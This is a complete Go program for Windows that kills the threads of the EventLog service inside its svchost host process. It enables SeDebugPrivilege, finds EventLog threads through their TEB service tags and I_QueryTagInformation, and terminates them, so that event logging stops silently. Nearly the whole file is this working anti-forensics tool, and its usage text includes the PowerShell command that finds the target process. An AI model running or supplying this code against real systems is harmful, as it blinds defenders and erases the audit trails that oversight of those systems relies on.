package main

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

//dll exports
var (
	Kernel32                 = syscall.MustLoadDLL("Kernel32.dll")
	Ntdll                    = syscall.MustLoadDLL("Ntdll.dll")
	advapi32                 = syscall.MustLoadDLL("advapi32.dll")
	User32                   = syscall.MustLoadDLL("User32.dll")
	NtQueryInformationThread = Ntdll.MustFindProc("NtQueryInformationThread")
	OpenThread               = Kernel32.MustFindProc("OpenThread")
	I_QueryTagInformation    = advapi32.MustFindProc("I_QueryTagInformation")
	ReadProcessMemory        = Kernel32.MustFindProc("ReadProcessMemory")
	IsWow64Process           = Kernel32.MustFindProc("IsWow64Process")
	TerminateThread          = Kernel32.MustFindProc("TerminateThread")
	CreateToolhelp32Snapshot = Kernel32.MustFindProc("CreateToolhelp32Snapshot")
	Thread32First            = Kernel32.MustFindProc("Thread32First")
	Thread32Next             = Kernel32.MustFindProc("Thread32Next")
	LookupPrivilegeValue     = advapi32.MustFindProc("LookupPrivilegeValueW")
	AdjustTokenPrivileges    = advapi32.MustFindProc("AdjustTokenPrivileges")
)

const (
	THREAD_QUERY_LIMITED_INFORMATION = 0x0800
	THREAD_ALL_ACCESS                = 0x001F03FF //STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF
	PROCESS_ALL_ACCESS               = 0x000F0000 | 0x00100000 | 0xFFF
	PROCESS_VM_READ                  = 0x0010
	TH32CS_SNAPTHREAD                = 0x00000004
	SE_DEBUG_NAME                    = "SeDebugPrivilege"
	SE_PRIVILEGE_ENABLED             = 0x00000002
)


type CLIENT_ID struct {
	UniqueProcess syscall.Handle
	UniqueThread  syscall.Handle
}

type THREAD_BASIC_INFORMATION struct {
	ExitStatus     uint32
	TebBaseAddress uintptr
	ClientId       CLIENT_ID
	AffinityMask   uintptr
	Priority       uint32
	BasePriority   uint32
}

type SC_SERVICE_TAG_QUERY struct {
	processId  uint32
	serviceTag uint32
	Unknown    uint32
	pBuffer    unsafe.Pointer
}

type THREADENTRY32 struct {
	dwSize             uint32
	cntUsage           uint32
	th32ThreadID       uint32
	th32OwnerProcessID uint32
	tpBasePri          int
	tpDeltaPri         int
	dwFlags            uint32
}

type LUID struct {
	LowPart  uint32
	HighPart uint32
}

type LUID_AND_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_AND_ATTRIBUTES
}

func main() {

	if len(os.Args) != 2 {
		fmt.Println("[*] Usage", os.Args[0], "pid")
		fmt.Println("[*] You can run the following command to get the PID of the corresponding process svchost.exe of eventlog service")
		fmt.Println(`[*] powershell -c "Get-WmiObject -Class win32_service -Filter \"name = 'eventlog'\" | select -exp ProcessId"`)
		return
	}

	if !SeDebugPrivilege() {
		fmt.Println("[*]SeDebugPrivilege Error")
		return
	}

	pid, err := strconv.Atoi(os.Args[1])
	if err != nil {
		return
	}

	tids := GetallThread(uint32(pid))
	for _, tid := range tids {
		ServiceName := GetServiceName(tid)
		if ServiceName == nil {
			continue
		}
		if strings.EqualFold(PVOIDToStr(ServiceName), "EventLog") {
			fmt.Println("[*]EventLog Thread ID:", tid)
			TerminateEventLog(tid)
		}
	}
}

//viod* to string
func PVOIDToStr(pviod unsafe.Pointer) string {
	var s [8]byte //Because it only targets the string "EventLog", the length is directly written as 8
	for x := 0; x < len(s); x++ {
		s[x] = *(*byte)(unsafe.Pointer((uintptr(pviod) + uintptr(x*2))))
	}
	return string(s[:])
}

func TerminateEventLog(tid uint32) {
	thread, _, err := OpenThread.Call(
		uintptr(THREAD_ALL_ACCESS),
		0,
		uintptr(tid),
	)
	if !CheckErr(err) {
		return
	}
	r, _, err := TerminateThread.Call(
		thread,
		0,
	)
	if r != 0 && CheckErr(err) {
		fmt.Printf("[*]Kill Thread %d Success\n", tid)
	} else {
		fmt.Printf("[!]Kill Thread %d Fail\n", tid)
	}
}

func GetallThread(pid uint32) []uint32 {
	var th THREADENTRY32
	var alltid []uint32

	th.dwSize = 28 //sizeof(th)
	hThreadSnap, _, err := CreateToolhelp32Snapshot.Call(
		uintptr(TH32CS_SNAPTHREAD),
		0,
	)

	if !CheckErr(err) {
		return nil
	}
	r, _, err := Thread32First.Call(
		hThreadSnap,
		uintptr(unsafe.Pointer(&th)),
	)
	if !CheckErr(err) {
		return nil
	}

	for {
		r, _, err = Thread32Next.Call(
			hThreadSnap,
			uintptr(unsafe.Pointer(&th)),
		)
		if r == 0 {
			break
		}
		if th.th32OwnerProcessID == pid {
			alltid = append(alltid, th.th32ThreadID)
		}
	}
	return alltid
}

func GetServiceName(tid uint32) unsafe.Pointer {
	thread, _, err := OpenThread.Call(
		uintptr(THREAD_QUERY_LIMITED_INFORMATION),
		0,
		uintptr(tid),
	)

	if !CheckErr(err) || thread == 0 {
		return nil
	}

	var threadinfo THREAD_BASIC_INFORMATION

	_, _, err = NtQueryInformationThread.Call(
		thread,
		0,
		uintptr(unsafe.Pointer(&threadinfo)),
		unsafe.Sizeof(threadinfo),
		0,
	)

	if !CheckErr(err) {
		return nil
	}

	var subProcessTag uint32

	hProcess, err := syscall.OpenProcess(uint32(PROCESS_VM_READ), false, uint32(threadinfo.ClientId.UniqueProcess))
	if !CheckErr(err) {
		return nil
	}
	defer syscall.Close(hProcess)

	var dwOffset uintptr
	systembit := 32 << (^uint(0) >> 63) //Determine whether the system is 64-bit or 32-bit

	if systembit == 64 {
		dwOffset = 0x1720
	} else if systembit == 32 {
		dwOffset = 0xf60
	} else {
		fmt.Println("[!]Unknown Error")
		return nil
	}

	_, _, err = ReadProcessMemory.Call(
		uintptr(hProcess),
		threadinfo.TebBaseAddress+dwOffset,
		uintptr(unsafe.Pointer(&subProcessTag)),
		unsafe.Sizeof(subProcessTag),
		0,
	)

	if !CheckErr(err) || subProcessTag == 0 {
		return nil
	}

	var tag SC_SERVICE_TAG_QUERY
	tag.processId = uint32(threadinfo.ClientId.UniqueProcess)
	tag.serviceTag = subProcessTag

	_, _, err = I_QueryTagInformation.Call(
		0,
		1,
		uintptr(unsafe.Pointer(&tag)),
	)

	if !CheckErr(err) {
		return nil
	}
	return tag.pBuffer

}

func CheckErr(err error) bool {
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println("[!]", err.Error())
		return false
	}
	return true
}

//Enable SeDebugPrivilege
func SeDebugPrivilege() bool {
	var luid LUID
	var hToken syscall.Token
	var tp TOKEN_PRIVILEGES
	r, _, err := LookupPrivilegeValue.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(SE_DEBUG_NAME))),
		uintptr(unsafe.Pointer(&luid)),
	)
	if r != 1 && !CheckErr(err) {
		return false
	}

	hProcess, err := syscall.GetCurrentProcess()

	if !CheckErr(err) {
		return false
	}
	defer syscall.Close(hProcess)

	err = syscall.OpenProcessToken(hProcess, syscall.TOKEN_ADJUST_PRIVILEGES, &hToken)
	if !CheckErr(err) {
		return false
	}

	tp.PrivilegeCount = 1
	tp.Privileges[0].Luid = luid
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

	r, _, err = AdjustTokenPrivileges.Call(
		uintptr(hToken),
		0,
		uintptr(unsafe.Pointer(&tp)),
		unsafe.Sizeof(tp),
		0,
		0,
	)

	if r != 1 && !CheckErr(err) {
		return false
	}
	return true
}
